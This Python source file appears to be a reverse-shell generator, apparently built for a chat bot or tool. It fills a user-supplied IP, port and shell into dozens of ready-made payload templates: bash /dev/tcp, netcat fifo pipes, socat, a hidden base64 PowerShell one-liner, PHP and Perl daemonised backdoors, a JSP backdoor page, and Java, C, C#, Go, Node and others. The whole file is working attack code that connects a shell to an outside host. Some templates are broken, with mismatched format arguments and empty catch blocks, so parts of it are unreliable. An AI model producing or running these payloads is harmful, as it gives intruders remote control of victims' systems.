import re
import base64

types = ["sh", "bash", "nc", "netcat", "ncat", "dart", "rustcat", "rcat", "c", "c#", "cs", "csharp", "haskell", "perl", "pl", "php", "ps", "ps1", "pwsh", "powershell", "python3", "python2", "py", "python", "ruby", "rb", "socat", "nodejs", "node.js", "java", "jsp", "javascript", "js", "groovy", "telnet", "zsh", "lua", "golang", "go", "vlang", "v", "awk", "xterm", "gawk"]
shells = ["sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "powershell.exe", "cmd.exe", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "rbash", "dash"]
    
def create(type, host, port, shell):
    global types, shells
    if (type.lower() not in types):
        return "Invalid type specified!"
    
    if (shell.lower() not in shells):
        return "Invalid shell provided!"
    
    if (not re.match(r"^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$", host)):
        return "Invalid host provided!"
    
    try:
        port = int(port)
        if (port < 1 or port > 65535):
            raise Exception()
    except:
        return "Invalid port specified!"
    
    ret = ""
    type = type.lower()
    port = str(port)
    if (type == "dart"):
        ret = """
**Dart**
```dart
import 'dart:io';
import 'dart:convert';

main() {
    Socket.connect("%s", %s).then((socket) {
        socket.listen((data) {
            Process.start('%s', []).then((Process process) {
                process.stdin.writeln(new String.fromCharCodes(data).trim());
                process.stdout.transform(utf8.decoder).listen((output) { 
                    socket.write(output); 
                });
            });
        },
        onDone: () {
            socket.destroy();
        });
    });
}```""" %(host, port, shell)
    elif (type == "gawk"):
        ret = """
**Gawk**
```gawk
#!/usr/bin/gawk -f

BEGIN {
    Port    =       %s
    Prompt  =       "bkd> "

    Service = "/inet/tcp/" Port "/0/0"
    while (1) {
        do {
            printf Prompt |& Service
            Service |& getline cmd
            if (cmd) {
                while ((cmd |& getline) > 0)
                    print $0 |& Service
                close(cmd)
            }
        } while (cmd != "exit")
        close(Service)
    }
}```""" % port
    elif (type == "xterm"):
        ret = """
**Xterm**
```sh
xterm -display %s:1```""" % host
    elif (type == "awk"):
        ret = """
**Awk**
```sh
awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null```""" %(host, port)
    elif (type == "vlang" or type == "v"):
        ret = """
**Vlang**
```sh
echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e %s %s %s 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v```"""%(shell, host, port, shell, host, port)
    elif (type == "golang" or type == "go"):
        ret = """
**Golang**
```sh
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("%s");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go```"""%(host, port, shell, host, port, shell)
    elif (type == "lua"):
        ret = """
**Lua**
```sh
lua5.1 -e 'local host, port = "%s", %s local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('%s -i <&3 >&3 2>&3');"```"""%(host, port, host, port, shell, host, port, shell, host, port)
    elif (type == "zsh"):
        ret = """
**Zsh**
```sh
zsh -c 'zmodload zsh/net/tcp && ztcp %s %s && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'```"""%(host, port)
    elif (type == "telnet"):
        ret = """
**Telnet**
```sh
TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | %s 1>$TF```"""%(host, port, shell)
    elif (type == "groovy"):
        ret = """
**Groovy**
```groovy
String host = "%s";
int port = %s;
String cmd = "%s";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed())  {
    while (pi.available() > 0)so.write(pi.read());
    while (pe.available() > 0)so.write(pe.read());
    while (si.available() > 0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}

};
p.destroy();
s.close();```"""%(host, port, shell)
    elif (type == "js" or type == "javascript"):
        ret = """
**Javascript**
```js
String command = "var host = '%s';" +
                "var port = %s;" +
                "var cmd = '%s';"+
                "var s = new java.net.Socket(host, port);" +
                "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                "var po = p.getOutputStream(), so = s.getOutputStream();"+
                "print ('Connected');"+
                "while (!s.isClosed()) {"+
                "    while (pi.available() > 0)"+
                "        so.write(pi.read());"+
                "    while (pe.available() > 0)"+
                "        so.write(pe.read());"+
                "    while (si.available() > 0)"+
                "        po.write(si.read());"+
                "    so.flush();"+
                "    po.flush();"+
                "    java.lang.Thread.sleep(50);"+
                "    try {"+
                "        p.exitValue();"+
                "        break;"+
                "    }"+
                "    catch (e) {"+
                "    }"+
                "}"+
                "p.destroy();"+
                "s.close();";
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";
ref.add(new StringRefAddr("x", x);```"""%(host, port, shell)
    elif (type == "jsp"):
        ret = """
**JSP**
```jsp
<%%@
	page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%%>
<%%!
static class StreamConnector extends Thread
{
	InputStream is;
	OutputStream os;
	StreamConnector(InputStream is, OutputStream os)
	{
		this.is = is;
		this.os = os;
	}
	public void run()
	{
		BufferedReader isr = null;
		BufferedWriter osw = null;
		try
		{
			isr = new BufferedReader(new InputStreamReader(is));
			osw = new BufferedWriter(new OutputStreamWriter(os));
			char buffer[] = new char[8192];
			int lenRead;
			while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
			{
				osw.write(buffer, 0, lenRead);
				osw.flush();
			}
		}
		catch (Exception ioe)
		try
		{
			if(isr != null) isr.close();
			if(osw != null) osw.close();
		}
		catch (Exception ioe)
	}
}
%%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
	IP Address
	<input type="text" name="ipaddress" size=30>
	Port
	<input type="text" name="port" size=10>
	<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%%
String ipAddress = request.getParameter("%s");
String ipPort = request.getParameter("%s");
if(ipAddress != null && ipPort != null)
{
	Socket sock = null;
	try
	{
		sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
		Runtime rt = Runtime.getRuntime();
		Process proc = rt.exec("%s");
		StreamConnector outputConnector =
		new StreamConnector(proc.getInputStream(),
			sock.getOutputStream());
		StreamConnector inputConnector =
		new StreamConnector(sock.getInputStream(),
			proc.getOutputStream());
		outputConnector.start();
		inputConnector.start();
	}
	catch(Exception e) 
}
%%>
```"""%(host, port, shell)
    elif (type == "java"):
        ret = """
**Java**
```java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("%s -c $@|%s 0 echo %s -i >& /dev/tcp/%s/%s 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "%s";
        int port = %s;
        String cmd = "%s";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}```"""%(shell, shell, shell, host, port, host, port, shell)
    elif (type == "nodejs" or type == "node.js"):
        ret = """
**NodeJS**
```js
require('child_process').exec('nc -e %s %s %s')```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("%s", []);
    var client = new net.Socket();
    client.connect(%s, "%s", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();```"""%(shell, host, port, shell, port, host)
    elif (type == "socat"):
        ret = """
**Socat**
```sh
socat TCP:%s:%s EXEC:'%s',pty,stderr,setsid,sigint,sane```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
socat TCP:%s:%s EXEC:%s```"""%(host, port, shell, host, port, shell)
    elif (type == "ruby" or type == "rb"):
        ret = """
**Ruby**
```sh
ruby -rsocket -e'spawn("%s",[:in,:out,:err]=>TCPSocket.new("%s",%s))'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%s");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'```"""%(shell, host, port, host, port)
    elif (type == "python" or type == "python3" or type == "py" or type == "python2"):
        ret = """
**Python**
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("%s")'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```py
import os, socket, subprocess, threading

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("%s",%s))
p=subprocess.Popen(["%s"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()```"""%(host, port, shell, host, port, shell)
    elif (type == "ps" or type == "pwsh" or type == "powershell" or type == "ps1"):
        tmp = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"%(host, port)
        tmp = tmp.encode("utf-16-le")
        b = base64.b64encode(tmp).decode()
        ret = """
**PowerShell**
```ps
powershell -nop -W hidden -noni -ep bypass -c '$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```ps
powershell -e %s```"""%(host, port, b)
    elif (type == "php"):
        ret = """
**PHP**
```sh
php -r '$sock=fsockopen("%s",%s);$proc=proc_open("%s", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
php -r '$sock=fsockopen("%s",%s);system("%s <&3 >&3 2>&3");'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
php -r '$sock=fsockopen("%s",%s);exec("%s <&3 >&3 2>&3");'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
php -r '$sock=fsockopen("%s",%s);popen("%s <&3 >&3 2>&3", "r");'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '%s';
$port = %s;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; %s -i';
$daemon = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) exit(1);
	if ($pid) exit(0);
	if (posix_setsid() == -1) exit(1);
	$daemon = 1;
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	exit(1);
}
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
	if (feof($sock)) break;
	if (feof($pipes[1])) break;
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		$input = fread($sock, $chunk_size);
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		$input = fread($pipes[1], $chunk_size);
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		$input = fread($pipes[2], $chunk_size);
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```"""%(host, port, shell, host, port, shell, host, port, shell, host, port, shell, host, port, shell)
    elif (type == "perl" or type == "pl"):
        ret = """
**Perl**
```sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```perl
perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%s -i");};'```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```perl
#!/usr/bin/perl -w

use strict;
use Socket;
use FileHandle;
use POSIX;

my $VERSION = "1.0";
my $ip = '%s';
my $port = %s;

my $daemon = 1;
my $auth   = 0;
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

$0 = "[httpd]";

if (defined($ENV{'REMOTE_ADDR'})) {
	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiexit(0);
}

if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0);
	}

	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {} else {
	cgiexit();	
}

open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"%s"} ($fake_process_name, "-i"));

sub cgiexit {
	exit 0;
}```"""%(host, port, host, port, shell, host, port, shell)
    elif (type == "haskell"):
        ret = """
**Haskell**
```haskell
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | %s -i 2>&1 | nc %s %s >/tmp/f"```"""%(shell, host, port)
    elif (type == "c#" or type == "cs" or type == "csharp"):
        ret = """
**C#**
```cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack {
	public class Program {
		static StreamWriter streamWriter;
		public static void Main(string[] args) {
			using(TcpClient client = new TcpClient("%s", %s)) {
				using(Stream stream = client.GetStream()) {
					using(StreamReader rdr = new StreamReader(stream)) {
						streamWriter = new StreamWriter(stream);
						StringBuilder strInput = new StringBuilder();
						Process p = new Process();
						p.StartInfo.FileName = "%s";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();
						while(true) {
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data)) {
                try {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                } catch (Exception err) {}
            }
        }
	}
}```"""%(host, port, shell)
    elif (type == "c"):
        ret = """
**C**
```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    int port = %s;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("%s");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"%s", NULL};
    execve("%s", argv, NULL);

    return 0;       
}
```"""%(port, host, shell, shell)
    elif (type == "rcat" or type == "rustcat"):
        ret = """
**RustCat**
```sh
rcat %s %s -r %s```"""%(host, port, shell)
    elif (type == "nc" or type == "netcat" or type == "ncat"):
        ret = """
**Netcat**
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|ncat -u %s %s >/tmp/f```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
ncat %s %s -e %s```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
nc -c %s %s %s```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
nc %s %s -e %s```"""%(shell, host, port, shell, host, port, host, port, shell, shell, host, port, host, port, shell)
    elif (type == "sh" or type == "bash"):
        ret = """
**Bash**
```sh
%s -i >& /dev/udp/%s/%s 0>&1```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
%s -i >& /dev/tcp/%s/%s 0>&1```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
%s -i 5<> /dev/tcp/%s/%s 0<&5 1>&5 2>&5```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done```━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━```sh
0<&196;exec 196<>/dev/tcp/%s/%s; %s <&196 >&196 2>&196```"""%(shell, host, port, shell, host, port, shell, host, port, host, port, host, port, shell)

    return ret